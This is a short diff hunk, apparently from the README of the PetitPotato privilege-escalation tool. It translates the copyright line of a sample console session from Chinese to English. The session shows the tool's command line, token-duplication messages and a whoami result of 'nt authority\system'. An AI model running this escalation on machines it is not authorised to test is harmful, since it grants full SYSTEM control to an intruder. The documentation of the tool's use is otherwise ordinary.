@@ -41,7 +41,7 @@ C:\Users\Administrator\Desktop>PetitPotato.exe 3 cmd.exe
 [+] DuplicateTokenEx OK.
 [+] CreateProcessAsUser OK.
 Microsoft Windows [版本 10.0.18363.592]
-(c) 2019 Microsoft Corporation。保留所有权利。
+(c) 2019 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 nt authority\system
